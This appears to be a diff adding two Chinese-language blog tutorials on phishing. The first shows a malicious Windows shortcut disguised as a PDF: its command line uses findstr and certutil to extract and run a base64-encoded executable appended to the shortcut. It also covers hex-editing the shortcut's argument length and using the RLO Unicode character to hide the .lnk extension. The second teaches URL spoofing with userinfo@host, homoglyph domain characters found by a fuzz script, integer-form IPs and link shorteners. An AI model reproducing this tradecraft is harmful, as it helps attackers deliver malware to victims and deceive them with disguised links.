+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c copy cmd.pdf.lnk %temp%\cmdhack &amp; findstr &quot;TVqQAAMAAAAEAAA&quot; %temp%\cmdhack &gt; %temp%\hack &amp; certutil -decode %temp%\hack %temp%\cmd.exe &amp; %temp%\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>本地执行</p>
+<p><img src="/images/1665467986539-d2a3a6a4-b67c-4c40-8c8b-0e2b34036c8f.png"></p>
+<p>成功上线</p>
+<p><img src="/images/1665467942850-b3dfbf5a-151a-49a2-98f1-c85ffdb9bae1.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以该方式就是，提前将恶意程序的base64追加到快捷方式</p>
+<p>发送给受害机</p>
+<p>受害机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.用findstr提取对应的恶意编码</span><br><span class="line"></span><br><span class="line">2.certutil -decode对恶意编码进行解码，输出至文件中</span><br><span class="line"></span><br><span class="line">3.本地执行此文件</span><br></pre></td></tr></table></figure>
+
+<p>成功上线</p>
+<p>该方式只会在最后一步，本地执行此文件进行查杀，所以将exe的免杀做好就行</p>
+<h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2><p>要先设置目标后再进行恶意负载的追加</p>
+<p><img src="/images/1665472045813-2bc1ed2f-1f30-4b91-b6a4-748bb7fc8146.png"></p>
+<p>因为目标已修改，追加的内容同时也会被刷新没掉</p>
+<p><img src="/images/1665474274726-1565b7a5-f3bc-49ca-b6e7-043b05f3d39d.png"></p>
+<h2 id="过长参数处理"><a href="#过长参数处理" class="headerlink" title="过长参数处理"></a>过长参数处理</h2><p>部分主机中，快捷方式指定的参数存在长度限制，当我们想要设置复杂的命令时，会被截断，无法有效运行</p>
+<h5 id="这时可直接编辑该文件设置其参数"><a href="#这时可直接编辑该文件设置其参数" class="headerlink" title="这时可直接编辑该文件设置其参数"></a>这时可直接编辑该文件设置其参数</h5><p>下面以010Editor为例</p>
+<p>在COMMAND_LINE_ARGUMENTS中，注意此处为宽字节</p>
+<p><img src="/images/1665472376694-53070b44-f220-424b-b8ad-f9a3f34be83b.png"></p>
+<p>我们这里将长度更改为 300，与其对应的，在 01FBH处添加 (300 - 157) * 2 &#x3D; 286个字节。</p>
+<p><img src="/images/1665472900336-5d026455-8c2d-43db-978d-2a612e066b7b.png"></p>
+<p><img src="/images/1665473037840-4930e672-fdf9-4e8a-8133-448b5a6c3d5c.png"></p>
+<p><img src="/images/1665473487702-0069c60a-9e84-447d-af7d-2a1af56fd50f.png"></p>
+<p>然后再填入相关命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/c copy cmd.pdf.lnk %temp%\cmdhack &amp; findstr &quot;TVqQAAMAAAAEAAA&quot; %temp%\cmdhack &gt; %temp%\hack &amp; certutil -decode %temp%\hack %temp%\cmd.exe &amp; %temp%\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665474657690-79b0425a-0e96-47cb-864b-5b504b7990e6.png"></p>
+<p>运行即上线</p>
+<p><img src="/images/1665475113282-ffede604-f1b5-48dc-93f4-9b904c30c2d0.png"></p>
+<h2 id="隐藏后缀"><a href="#隐藏后缀" class="headerlink" title="隐藏后缀"></a>隐藏后缀</h2><p>上述lnk和真实的pdf相比，还多了一个快捷方式的标志</p>
+<p><img src="/images/1665451568354-fc4ef57e-c5f6-46da-ac29-dff3436a976a.png"></p>
+<p>而且在单独发送该快捷方式文件时，会显示出Lnk后缀</p>
+<p><img src="/images/1665451618704-cfaa2519-a622-4b91-871d-c7021a961989.png"></p>
+<p>这时我们可以选择在文件名中插入unicode字符，来实现一个视觉上的隐藏效果</p>
+<h5 id="借助RLO字符"><a href="#借助RLO字符" class="headerlink" title="借助RLO字符"></a>借助RLO字符</h5><p>借助RLO字符使部分字符从右向左读</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;RLO&gt;可以使文件名，把&lt;RLO&gt;后面的字符串反向输出</span><br></pre></td></tr></table></figure>
+
+<h5 id="注意，不能直接输入-lt-gt"><a href="#注意，不能直接输入-lt-gt" class="headerlink" title="注意，不能直接输入&lt;&gt;"></a>注意，不能直接输入&lt;&gt;</h5><p><img src="/images/1665476335516-aa884d29-153d-49d7-b917-f6a3a31ca4f6.png"></p>
+<h5 id="右键–-gt-插入unicode"><a href="#右键–-gt-插入unicode" class="headerlink" title="右键–&gt;插入unicode"></a>右键–&gt;插入unicode</h5><p>在想要插入的地方右键–&gt;插入unicode–&gt;RLO</p>
+<p><img src="/images/1665477214353-8e64941a-4d98-4867-81c1-8d90ee2cefb2.png"></p>
+<p><img src="/images/1665477331163-0842d5f8-ec5c-4ea0-ac1d-7f45940b558a.png"></p>
+<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>将快捷方式重命名为M<RLO>fdp.历简</RLO></p>
+<p><img src="/images/1665477692051-f245a0b4-655d-4186-915f-397caa397b2e.png"></p>
+<p>并不更改文件属性</p>
+<p><img src="/images/1665477821386-e204c1de-cc0b-465d-b43a-2579d1bf9766.png"></p>
+<p>注意修改完文件名，命令也需要修改</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">M‮fdp.历简.lnk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665478534564-b79529b0-91eb-44ae-9be5-be4f3f0b114a.png"></p>
+<p>注意，复制完直接粘贴过去，因为<RLO>粘贴进去会显示为其他东东</RLO></p>
+<p><img src="/images/1665478705153-885c62ce-8894-4e3f-830f-9b9b06f3f68c.png"></p>
+<p>运行即上线</p>
+<p><img src="/images/1665478279003-94c1ad2c-d640-46c7-b1f3-47e111d364c3.png"></p>
 ]]></content>
       <categories>
         <category>社工</category>
@@ -2487,6 +2852,74 @@
 <p>可以看到发件人变为我们自定义的</p>
 <p><img src="/images/1666362095958-d116546e-a3da-4b2c-87a7-897ed4f10a69.png"></p>
 <p>注意，可能是我之前用qq邮箱干过啥，不确定的邮件都发不进来，所以这里也需要将admin.com加入白名单域名</p>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>钓鱼之url魔改</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/%E9%92%93%E9%B1%BC%E4%B9%8Burl%E9%AD%94%E6%94%B9/</url>
+    <content><![CDATA[<h3 id="url语法格式利用"><a href="#url语法格式利用" class="headerlink" title="url语法格式利用"></a>url语法格式利用</h3><p>url的语法格式可以细分为九个部分</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</span><br></pre></td></tr></table></figure>
+
+<p>拿http协议的url举例，我们通常不会在host前加用户名密码对，这是因为请求的资源匿名即可访问</p>
+<p>但是在host前加上用户名密码对也并不会影响资源的访问，借此我们可以在url中构造任意的用户名密码对</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://root:123456@www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://root@www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230209090030474.png" alt="image-20230209090030474"></p>
+<p>点击“是”后正常访问百度(换个浏览器甚至都不弹窗)</p>
+<p>所以，如果要构造一个模拟百度的恶意请求，实则是访问hacker.com</p>
+<p>可以通过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@hacker.com</span><br></pre></td></tr></table></figure>
+
+<p>点击后访问的便是hacker.com</p>
+<p><img src="/images/image-20230209090523890.png" alt="image-20230209090523890"></p>
+<p>为了更隐蔽，可以像添加参数一样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@hacker.com</span><br></pre></td></tr></table></figure>
+
+<p>此时”<a href="http://www.baidu.com&action=login" 为用户名 ">www.baidu.com&amp;action=login&quot;为用户名</a></p>
+<h3 id="浏览器域名解码利用"><a href="#浏览器域名解码利用" class="headerlink" title="浏览器域名解码利用"></a>浏览器域名解码利用</h3><p>上述对url进行了一番伪造，但是隐藏在url后面的真实域名hacker.com仍会引起警.</p>
+<p>由于DNS服务器的解析是由英文代码所构成，所以浏览器会在访问资源前会对域名进行解码，而多个ascii字符会被解码成同一个英文字母，我们可以编写简单的JavaScript脚本进行fuzz。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (let i=0;i&lt;=65535;i++)</span><br><span class="line">&#123;</span><br><span class="line">    var a = &#x27;https://&#x27;+ String.fromCharCode(i) +&#x27;acker.com&#x27;;</span><br><span class="line">    try&#123;</span><br><span class="line">        let url = new URL(a);</span><br><span class="line">         if (url.hostname &amp;&amp; url.hostname == &quot;hacker.com&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                console.log(i,String.fromCharCode(i));</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;catch&#123;</span><br><span class="line">        // console.log(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230209092819579.png" alt="image-20230209092819579"></p>
+<p>比如英文字母”h”同时对应</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">72 H </span><br><span class="line">104 h </span><br><span class="line">688 ʰ </span><br><span class="line">7476 ᴴ </span><br><span class="line">8341 ₕ </span><br><span class="line">8459 ℋ </span><br><span class="line">8460 ℌ </span><br><span class="line">8461 ℍ </span><br><span class="line">8462 ℎ </span><br><span class="line">9405 Ⓗ </span><br><span class="line">9431 ⓗ </span><br><span class="line">65320 Ｈ </span><br><span class="line">65352 ｈ</span><br></pre></td></tr></table></figure>
+
+<p>url就可以构造为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.bing.com&amp;action=login@ℋacker.com</span><br></pre></td></tr></table></figure>
+
+<p>成功访问hacker.com</p>
+<p><img src="/images/image-20230209093356378.png" alt="image-20230209093356378"></p>
+<p>配合一些短链接可避开hacker这样的字段</p>
+<p>短链接在线生成</p>
+<p><a href="https://urls.vip/">https://urls.vip/</a></p>
+<h3 id="IP整数形式利用"><a href="#IP整数形式利用" class="headerlink" title="IP整数形式利用"></a>IP整数形式利用</h3><p>还可以通过ip地址替换hacker.com</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@127.0.0.1:88</span><br></pre></td></tr></table></figure>
+
+<p>为了更好的隐藏ip地址，我们可以将ip地址的点分十进制表示方式转换为整数表示，转换原理的简单解释：</p>
+<p>IP 地址（IPv4）由32 位的 8 位二进制文件的组合组成。</p>
+<p>由于输入实际的二进制组合（例如：11000000）非常不方便，因此使用与二进制对应的十进制（例如：192），浏览器在解析整数形式的ip地址时，会将URL中的十进制转换为二进制并分割成8位，然后从将8位的二进制数字转换为对应的十进制。</p>
+<p>拿127.0.0.1举例，对应的二进制应该是01111111 00000000 00000000 00000001，二进制进一步转换成得到整数形式的IP 2130706433</p>
+<p><img src="/images/image-20230209094020470.png" alt="image-20230209094020470"></p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://2130706433:88</span><br></pre></td></tr></table></figure>
+
+<p>访问后会跳转到127.0.0.1</p>
+<p><img src="/images/image-20230209094134131.png" alt="image-20230209094134131"></p>
+<p>于是url进一步伪造成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@2130706433:88</span><br></pre></td></tr></table></figure>
+
+<p>末尾可以使用frag稍加修饰，最终我们将ikun.org 魔改成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@2130706433:88#test.docx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230209094507161.png" alt="image-20230209094507161"></p>
 ]]></content>
       <categories>
         <category>社工</category>
